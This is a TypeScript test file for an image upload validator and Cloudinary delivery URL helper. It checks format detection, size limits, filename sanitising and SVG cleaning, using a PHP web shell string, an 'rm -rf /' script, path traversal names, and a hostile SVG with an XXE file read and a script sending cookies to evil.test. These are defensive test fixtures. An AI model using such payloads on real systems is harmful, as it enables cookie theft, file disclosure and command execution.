/**
 * Image upload validation and CDN delivery.
 *
 *   npx tsx src/test/mediaupload.e2e.ts
 *
 * No database and no Cloudinary account needed — every assertion here is
 * pure. That is the whole reason both modules under test were written without
 * dependencies: this file decides whether a renamed executable can enter the
 * image pipeline, and whether a five-year-old product URL still renders. A
 * rule that can only be checked by standing up infrastructure is a rule that
 * gets checked once, by hand, on the day it is written.
 *
 * Covers four questions:
 *   1. Are the supported formats accepted, with their real dimensions read?
 *   2. Is everything else refused — including files that lie about what they
 *      are, and files whose header parses but describes nothing?
 *   3. Does SVG sanitisation actually remove the scriptable parts?
 *   4. Does the delivery transform leave alone every URL it does not fully
 *      understand? (the backward-compatibility guarantee)
 */
// Pinned before any import — mailer.ts will not open an SMTP connection under
// NODE_ENV=test. See checkout.e2e.ts for why that matters.
process.env.NODE_ENV = 'test';

import {
  probeImage,
  probeVideo,
  validateUpload,
  sanitizeSvg,
  sanitizeFilename,
  extensionOf,
} from '../services/imageValidation.service';
import {
  cloudinaryImageUrl,
  cloudinarySrcSet,
  responsiveImage,
  IMAGE_PRESETS,
} from '@glamirk/shared/utils/cloudinaryImage';

let passed = 0;
let failed = 0;
const failures: string[] = [];

function check(name: string, condition: boolean, detail?: string): void {
  if (condition) {
    passed++;
    console.log(`  PASS  ${name}`);
  } else {
    failed++;
    failures.push(name + (detail ? ` — ${detail}` : ''));
    console.error(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`);
  }
}
const section = (t: string) => console.log(`\n${t}`);

// ---------------------------------------------------------------------------
// Fixtures
//
// Real headers, built byte by byte rather than committed as binary files.
// Keeps the repository free of blobs and — more usefully — makes each one's
// structure readable, so a failing dimension assertion can be traced to the
// field that produced it.
// ---------------------------------------------------------------------------

function pngFixture(width: number, height: number): Buffer {
  const buf = Buffer.alloc(64);
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(buf, 0);
  buf.writeUInt32BE(13, 8); // IHDR length
  buf.write('IHDR', 12, 'ascii');
  buf.writeUInt32BE(width, 16);
  buf.writeUInt32BE(height, 20);
  buf[24] = 8; // bit depth
  buf[25] = 6; // colour type RGBA
  return buf;
}

function jpegFixture(width: number, height: number, { withExif = false } = {}): Buffer {
  const parts: Buffer[] = [Buffer.from([0xff, 0xd8])]; // SOI

  if (withExif) {
    // A fat APP1 segment in front of the frame header — this is what makes
    // "read bytes 6..9" wrong for JPEG and a marker walk necessary.
    const exif = Buffer.alloc(2 + 2 + 200);
    exif.writeUInt16BE(0xffe1, 0);
    exif.writeUInt16BE(202, 2);
    exif.write('Exif\0\0', 4, 'ascii');
    parts.push(exif);
  }

  const sof = Buffer.alloc(2 + 2 + 6);
  sof.writeUInt16BE(0xffc0, 0); // SOF0
  sof.writeUInt16BE(8, 2); // segment length
  sof[4] = 8; // sample precision
  sof.writeUInt16BE(height, 5);
  sof.writeUInt16BE(width, 7);
  parts.push(sof);
  // Padding so the buffer clears the 16-byte minimum comfortably.
  parts.push(Buffer.alloc(32, 0x11));
  return Buffer.concat(parts);
}

function gifFixture(width: number, height: number): Buffer {
  const buf = Buffer.alloc(32);
  buf.write('GIF89a', 0, 'ascii');
  buf.writeUInt16LE(width, 6);
  buf.writeUInt16LE(height, 8);
  return buf;
}

/** Lossy WebP — the VP8 chunk, with its sync code and two 14-bit sizes. */
function webpFixture(width: number, height: number): Buffer {
  const buf = Buffer.alloc(40);
  buf.write('RIFF', 0, 'ascii');
  buf.writeUInt32LE(32, 4);
  buf.write('WEBP', 8, 'ascii');
  buf.write('VP8 ', 12, 'ascii');
  buf.writeUInt32LE(20, 16);
  Buffer.from([0x9d, 0x01, 0x2a]).copy(buf, 23);
  buf.writeUInt16LE(width, 26);
  buf.writeUInt16LE(height, 28);
  return buf;
}

/** Lossless WebP — dimensions packed as two 14-bit fields, each stored minus one. */
function webpLosslessFixture(width: number, height: number): Buffer {
  const buf = Buffer.alloc(40);
  buf.write('RIFF', 0, 'ascii');
  buf.writeUInt32LE(32, 4);
  buf.write('WEBP', 8, 'ascii');
  buf.write('VP8L', 12, 'ascii');
  buf.writeUInt32LE(20, 16);
  buf[20] = 0x2f;
  buf.writeUInt32LE(((height - 1) << 14) | (width - 1), 21);
  return buf;
}

function avifFixture(width: number, height: number): Buffer {
  const head = Buffer.alloc(32);
  head.writeUInt32BE(32, 0);
  head.write('ftyp', 4, 'ascii');
  head.write('avif', 8, 'ascii');
  head.write('avifmif1miaf', 16, 'ascii');

  const ispe = Buffer.alloc(20);
  ispe.writeUInt32BE(20, 0);
  ispe.write('ispe', 4, 'ascii');
  ispe.writeUInt32BE(0, 8); // version + flags
  ispe.writeUInt32BE(width, 12);
  ispe.writeUInt32BE(height, 16);
  return Buffer.concat([head, Buffer.alloc(24, 0), ispe, Buffer.alloc(16, 0)]);
}

const mp4Fixture = () => {
  const buf = Buffer.alloc(32);
  buf.writeUInt32BE(32, 0);
  buf.write('ftyp', 4, 'ascii');
  buf.write('isom', 8, 'ascii');
  return buf;
};

const webmFixture = () => Buffer.concat([Buffer.from([0x1a, 0x45, 0xdf, 0xa3]), Buffer.alloc(32, 0x42)]);

const textFixture = (s: string) => Buffer.from(s.padEnd(64, ' '), 'utf8');

const LIMITS = {
  accept: 'image-or-video' as const,
  maxImageBytes: 20 * 1024 * 1024,
  maxVideoBytes: 60 * 1024 * 1024,
  allowSvg: true,
};

async function run() {
  // ========================================
  section('1. Supported formats are identified from their bytes');

  const png = probeImage(pngFixture(1200, 900));
  check('PNG is identified', png?.format === 'png', String(png?.format));
  check('...with its real dimensions', png?.width === 1200 && png?.height === 900, `${png?.width}x${png?.height}`);

  const jpeg = probeImage(jpegFixture(1920, 1080));
  check('JPEG is identified', jpeg?.format === 'jpeg');
  check('...with its real dimensions', jpeg?.width === 1920 && jpeg?.height === 1080, `${jpeg?.width}x${jpeg?.height}`);

  // The case a fixed-offset reader gets wrong. A phone photo always has EXIF.
  const exifJpeg = probeImage(jpegFixture(800, 600, { withExif: true }));
  check(
    'a JPEG with an EXIF block ahead of the frame header still measures correctly',
    exifJpeg?.width === 800 && exifJpeg?.height === 600,
    `${exifJpeg?.width}x${exifJpeg?.height}`
  );

  const webp = probeImage(webpFixture(640, 480));
  check('lossy WebP is identified', webp?.format === 'webp');
  check('...with its real dimensions', webp?.width === 640 && webp?.height === 480, `${webp?.width}x${webp?.height}`);

  const webpLossless = probeImage(webpLosslessFixture(300, 200));
  check(
    'lossless WebP (VP8L) is identified and measured',
    webpLossless?.format === 'webp' && webpLossless?.width === 300 && webpLossless?.height === 200,
    `${webpLossless?.width}x${webpLossless?.height}`
  );

  const avif = probeImage(avifFixture(2000, 1500));
  check('AVIF is identified', avif?.format === 'avif');
  check('...with its real dimensions', avif?.width === 2000 && avif?.height === 1500, `${avif?.width}x${avif?.height}`);

  const gif = probeImage(gifFixture(500, 400));
  check('GIF is identified', gif?.format === 'gif');
  check('...with its real dimensions', gif?.width === 500 && gif?.height === 400);

  const svg = probeImage(textFixture('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"></svg>'));
  check('SVG is identified', svg?.format === 'svg');
  check('...and reports no pixel dimensions', svg?.width === undefined);

  check('MP4 is recognised as video', probeVideo(mp4Fixture())?.format === 'mp4');
  check('WebM is recognised as video', probeVideo(webmFixture())?.format === 'webm');

  // ========================================
  section('2. An image container is never mistaken for a video, or vice versa');

  // Both AVIF and MP4 are ISO base media files whose fourth box is 'ftyp'.
  // Only the brand distinguishes them, and getting this wrong would mean an
  // AVIF uploaded with resource_type 'video' (Cloudinary rejects it) or an
  // MP4 entering the image pipeline.
  check('an AVIF is not claimed by the video probe', probeVideo(avifFixture(100, 100)) === null);
  check('an MP4 is not claimed by the image probe', probeImage(mp4Fixture()) === null);

  // ========================================
  section('3. Non-images are refused');

  const reject = (name: string, buffer: Buffer, filename: string) => {
    const r = validateUpload(buffer, filename, LIMITS);
    check(
      `${name} is refused`,
      r.outcome === 'rejected',
      r.outcome === 'accepted' ? `accepted as ${r.file.format}` : undefined
    );
    if (r.outcome === 'rejected') {
      // The message is shown to an admin; it must not be a stack trace or an
      // internal identifier.
      check(
        `...with an admin-readable message`,
        r.error.message.length > 10 && !/undefined|null|Error:|\bat \b/.test(r.error.message),
        r.error.message
      );
    }
  };

  reject('a plain text file', textFixture('just some notes about the campaign'), 'notes.txt');
  reject('a PDF', Buffer.concat([Buffer.from('%PDF-1.7\n'), Buffer.alloc(64, 0)]), 'invoice.pdf');
  reject('a ZIP archive', Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(64, 0)]), 'assets.zip');
  reject('a Windows executable', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64, 0x90)]), 'setup.exe');
  reject('an HTML page', textFixture('<!DOCTYPE html><html><body>hi</body></html>'), 'page.html');
  reject('a JavaScript file', textFixture('export function hack() { return 1; }'), 'payload.js');
  reject('a PHP file', textFixture('<?php system($_GET["c"]); ?>'), 'shell.php');
  reject('a shell script', textFixture('#!/bin/sh\nrm -rf /'), 'run.sh');

  // The central claim of the whole module: the name and the declared type are
  // worth nothing, only the bytes count.
  reject('an executable renamed to .png', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64, 0x90)]), 'logo.png');
  reject('an executable renamed to .jpg', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64, 0x90)]), 'product.jpg');

  // ========================================
  section('4. Corrupted images are refused even though their signature matches');

  const truncatedPng = pngFixture(100, 100).subarray(0, 20);
  check('a truncated PNG is refused', probeImage(truncatedPng) === null);

  const zeroSizePng = pngFixture(0, 0);
  check('a PNG declaring 0x0 is refused', probeImage(zeroSizePng) === null);

  const noIhdr = pngFixture(100, 100);
  noIhdr.write('JUNK', 12, 'ascii');
  check('a PNG whose IHDR chunk is missing is refused', probeImage(noIhdr) === null);

  const headerOnlyJpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.alloc(32, 0)]);
  check('a JPEG with no frame header is refused', probeImage(headerOnlyJpeg) === null);

  const badWebp = webpFixture(100, 100);
  badWebp[23] = 0x00; // break the VP8 sync code
  check('a WebP with a broken sync code is refused', probeImage(badWebp) === null);

  check('an empty buffer is refused', probeImage(Buffer.alloc(0)) === null);
  const emptyResult = validateUpload(Buffer.alloc(0), 'x.png', LIMITS);
  check(
    'an empty upload says so plainly',
    emptyResult.outcome === 'rejected' && /empty/i.test(emptyResult.error.message)
  );

  // ========================================
  section('5. Size limits are applied per type, after the type is known');

  const bigImage = Buffer.concat([pngFixture(100, 100), Buffer.alloc(21 * 1024 * 1024, 0)]);
  const bigResult = validateUpload(bigImage, 'huge.png', LIMITS);
  check('a 21 MB image is refused', bigResult.outcome === 'rejected');
  check(
    '...with 413, not 400',
    bigResult.outcome === 'rejected' && bigResult.error.status === 413,
    bigResult.outcome === 'rejected' ? String(bigResult.error.status) : undefined
  );
  check(
    '...and a message naming the limit',
    bigResult.outcome === 'rejected' && bigResult.error.message.includes('20 MB'),
    bigResult.outcome === 'rejected' ? bigResult.error.message : undefined
  );

  // The point of deferring the size check: a 30 MB video is fine, and would
  // have been wrongly refused by a single limit applied to every upload.
  const bigVideo = Buffer.concat([mp4Fixture(), Buffer.alloc(30 * 1024 * 1024, 0)]);
  const videoResult = validateUpload(bigVideo, 'clip.mp4', LIMITS);
  check('a 30 MB video is accepted (the image limit does not apply to it)', videoResult.outcome === 'accepted');

  const imageOnly = validateUpload(mp4Fixture(), 'clip.mp4', { ...LIMITS, accept: 'image' });
  check('a video is refused where only images are accepted', imageOnly.outcome === 'rejected');

  // ========================================
  section('6. Extension and content must agree');

  const mismatch = validateUpload(pngFixture(100, 100), 'photo.jpg', LIMITS);
  check('PNG bytes named .jpg are refused', mismatch.outcome === 'rejected');
  check(
    '...with a message that says what to do',
    mismatch.outcome === 'rejected' && /\.jpg/i.test(mismatch.error.message) && /PNG/.test(mismatch.error.message),
    mismatch.outcome === 'rejected' ? mismatch.error.message : undefined
  );

  const jpgAlias = validateUpload(jpegFixture(100, 100), 'photo.jpeg', LIMITS);
  check('.jpeg is accepted for JPEG bytes', jpgAlias.outcome === 'accepted');

  const noExtension = validateUpload(pngFixture(100, 100), 'photo', LIMITS);
  check('a file with no extension is judged on its bytes alone', noExtension.outcome === 'accepted');

  // ========================================
  section('7. Accepted uploads report the verified type, not the claimed one');

  const accepted = validateUpload(webpFixture(1200, 1200), 'shade-swatch.webp', LIMITS);
  check('a WebP upload is accepted', accepted.outcome === 'accepted');
  if (accepted.outcome === 'accepted') {
    check('...reported as image/webp', accepted.file.mimeType === 'image/webp', accepted.file.mimeType);
    check('...with its dimensions attached', accepted.file.width === 1200 && accepted.file.height === 1200);
    check('...and classified as an image', accepted.file.kind === 'image');
  }

  // ========================================
  section('8. SVG is sanitised rather than stored as received');

  const hostile = `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <script>fetch('https://evil.test/?c='+document.cookie)</script>
  <a href="javascript:alert(1)"><rect width="10" height="10"/></a>
  <foreignObject><iframe src="https://evil.test"></iframe></foreignObject>
  <use xlink:href="https://evil.test/payload.svg#x"/>
  <circle cx="5" cy="5" r="4" fill="#F05A7E"/>
</svg>`;
  const cleaned = sanitizeSvg(hostile);

  check('the <script> element is gone', !/<script/i.test(cleaned.svg));
  check('the onload handler is gone', !/onload/i.test(cleaned.svg));
  check('the javascript: URI is gone', !/javascript:/i.test(cleaned.svg));
  check('the foreignObject is gone', !/<foreignObject/i.test(cleaned.svg));
  check('the embedded iframe is gone', !/<iframe/i.test(cleaned.svg));
  check('the ENTITY declaration is gone', !/<!ENTITY/i.test(cleaned.svg));
  check('the remote <use> reference is gone', !/evil\.test/i.test(cleaned.svg));
  // Sanitising must not mean destroying — the drawing has to survive.
  check('the actual artwork survives', cleaned.svg.includes('<circle') && cleaned.svg.includes('#F05A7E'));
  check('what was removed is reported for the log', cleaned.removed.length > 0, cleaned.removed.join(', '));

  const benign = '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h10v10H0z" fill="#C9972B"/></svg>';
  const benignResult = sanitizeSvg(benign);
  check('a clean SVG is left byte-identical', benignResult.svg === benign);
  check('...and reports nothing removed', benignResult.removed.length === 0);

  const svgOff = validateUpload(textFixture('<svg xmlns="http://www.w3.org/2000/svg"></svg>'), 'logo.svg', {
    ...LIMITS,
    allowSvg: false,
  });
  check('SVG is refused when the config disables it', svgOff.outcome === 'rejected');

  const svgOn = validateUpload(Buffer.from(hostile, 'utf8'), 'logo.svg', LIMITS);
  check('SVG is accepted when enabled', svgOn.outcome === 'accepted');
  if (svgOn.outcome === 'accepted') {
    check(
      '...and what is handed on for storage is the sanitised bytes, not the original',
      !svgOn.file.buffer.toString('utf8').includes('<script')
    );
    check('...with the removals recorded', svgOn.file.sanitizedNotes.length > 0);
  }

  // ========================================
  section('9. Filenames are defanged before being stored or displayed');

  check('a traversal path keeps only the basename', sanitizeFilename('../../../etc/passwd') === 'passwd');
  check('a Windows traversal path too', sanitizeFilename('..\\..\\windows\\system32\\cmd.exe') === 'cmd.exe');
  check(
    'a NUL-byte truncation attempt is stripped',
    !sanitizeFilename('photo.png .php').includes(' '),
    JSON.stringify(sanitizeFilename('photo.png .php'))
  );
  check('an empty name falls back rather than becoming ""', sanitizeFilename('') === 'upload');
  check('a dotfile-only name falls back', sanitizeFilename('...') === 'upload');
  check('an ordinary name is untouched', sanitizeFilename('Glamirk Hero 2026.png') === 'Glamirk Hero 2026.png');
  check('a very long name is bounded', sanitizeFilename('a'.repeat(400) + '.png').length <= 180);

  check('extensionOf reads the last segment', extensionOf('a.b.c.PNG') === 'png');
  check('extensionOf returns "" when there is none', extensionOf('README') === '');
  check('extensionOf ignores a leading dot', extensionOf('.gitignore') === '');

  // ========================================
  section('10. Delivery URLs: Cloudinary uploads are optimised');

  const stored = 'https://res.cloudinary.com/emu1kahg/image/upload/v1787701385/glamirk-beauty/foundation.jpg';
  const card = cloudinaryImageUrl(stored, 'card');

  check('f_auto is applied', card.includes('f_auto'));
  check('q_auto is applied', card.includes('q_auto'));
  check('the preset width is applied', card.includes('w_600'), card);
  check('c_limit is applied, so nothing is upscaled or stretched', card.includes('c_limit'));
  check('the version segment is preserved', card.includes('/v1787701385/'));
  check('the public ID is preserved', card.endsWith('/glamirk-beauty/foundation.jpg'));

  // Colour-critical slots must not be compressed like a background texture.
  check(
    'the gallery preset asks for the best quality tier',
    cloudinaryImageUrl(stored, 'gallery').includes('q_auto:best'),
    cloudinaryImageUrl(stored, 'gallery')
  );
  check('the detail preset does too', cloudinaryImageUrl(stored, 'detail').includes('q_auto:best'));
  check('the thumbnail preset uses the cheaper tier', cloudinaryImageUrl(stored, 'thumb').includes('q_auto:good'));

  // Caching depends on this. A URL that varies per render is a URL that is
  // never served from a warm edge cache.
  check(
    'the same input always produces the same URL',
    cloudinaryImageUrl(stored, 'card') === cloudinaryImageUrl(stored, 'card')
  );

  // Running the output back through must not stack a second transformation.
  check('the transform is idempotent', cloudinaryImageUrl(card, 'card') === card, cloudinaryImageUrl(card, 'card'));

  // ========================================
  section('11. Delivery URLs: everything else is passed through untouched');

  const untouched = [
    ['a legacy relative path', '/images/legacy-product.jpg'],
    ['a root-relative path', '/assets/banner.png'],
    ['an Unsplash seed image', 'https://images.unsplash.com/photo-123?w=400'],
    ['an unknown external CDN', 'https://cdn.example.test/product.jpg'],
    ['a data URI', 'data:image/png;base64,iVBORw0KGgo='],
    ['a blob URL from a local preview', 'blob:http://localhost:5173/abc-123'],
    ['a Cloudinary VIDEO url', 'https://res.cloudinary.com/demo/video/upload/v1/clip.mp4'],
    ['a Cloudinary fetch url', 'https://res.cloudinary.com/demo/image/fetch/https://x.test/a.jpg'],
    ['an SVG (f_auto would rasterise the logo)', 'https://res.cloudinary.com/demo/image/upload/v1/logo.svg'],
    ['a lookalike host', 'https://res.cloudinary.com.evil.test/image/upload/v1/x.jpg'],
    ['an empty string', ''],
  ] as const;

  for (const [label, url] of untouched) {
    check(`${label} is returned unchanged`, cloudinaryImageUrl(url, 'card') === url, cloudinaryImageUrl(url, 'card'));
    check(`${label} gets no srcset`, cloudinarySrcSet(url, 'card') === '');
  }

  check('undefined is handled', cloudinaryImageUrl(undefined, 'card') === '');
  check('null is handled', cloudinaryImageUrl(null, 'card') === '');

  // A public ID containing an underscore must not be read as a transformation
  // and skipped — `hero_banner.jpg` is a perfectly ordinary name.
  const underscored = 'https://res.cloudinary.com/demo/image/upload/v1/glamirk-beauty/hero_banner.jpg';
  check('a public ID with an underscore is still optimised', cloudinaryImageUrl(underscored, 'card').includes('f_auto'));

  // An already-transformed URL is left as the author wrote it.
  const preTransformed = 'https://res.cloudinary.com/demo/image/upload/w_100,c_fill/v1/x.jpg';
  check('an already-transformed URL is left alone', cloudinaryImageUrl(preTransformed, 'card') === preTransformed);

  // ========================================
  section('12. Responsive srcsets');

  const srcSet = cloudinarySrcSet(stored, 'card');
  const entries = srcSet.split(', ');
  check('a srcset is produced for a Cloudinary upload', entries.length > 1, String(entries.length));
  check('every entry carries a width descriptor', entries.every((e) => /\s\d+w$/.test(e)));
  check('every entry is a distinct width', new Set(entries.map((e) => e.split(' ')[1])).size === entries.length);

  // Offering a 1920px variant of a 600px card invites a high-DPR phone to
  // download it for no visible gain.
  const widths = entries.map((e) => Number(e.match(/(\d+)w$/)![1]));
  check(
    'no candidate exceeds the preset width',
    widths.every((w) => w <= IMAGE_PRESETS.card.width),
    widths.join(',')
  );
  check('the preset width itself is offered', widths.includes(IMAGE_PRESETS.card.width), widths.join(','));

  const heroWidths = cloudinarySrcSet(stored, 'hero')
    .split(', ')
    .map((e) => Number(e.match(/(\d+)w$/)![1]));
  check('the hero preset offers a 1920px candidate', heroWidths.includes(1920), heroWidths.join(','));
  check('...and still offers small ones for phones', heroWidths.includes(320));

  const resp = responsiveImage(stored, 'card');
  check('responsiveImage returns a src', !!resp.src && resp.src.includes('f_auto'));
  check('...a srcSet', !!resp.srcSet);
  check('...and a sizes hint', !!resp.sizes, resp.sizes);

  const respLegacy = responsiveImage('/images/old.jpg', 'card');
  check('responsiveImage on a legacy URL yields src only', respLegacy.src === '/images/old.jpg' && !respLegacy.srcSet);

  // ========================================
  console.log(`\n${'='.repeat(64)}`);
  console.log(`  ${passed} passed, ${failed} failed`);
  if (failures.length) {
    console.log('\n  Failures:');
    for (const f of failures) console.log(`    - ${f}`);
  }
  console.log(`${'='.repeat(64)}\n`);
  process.exit(failed > 0 ? 1 : 0);
}

run();
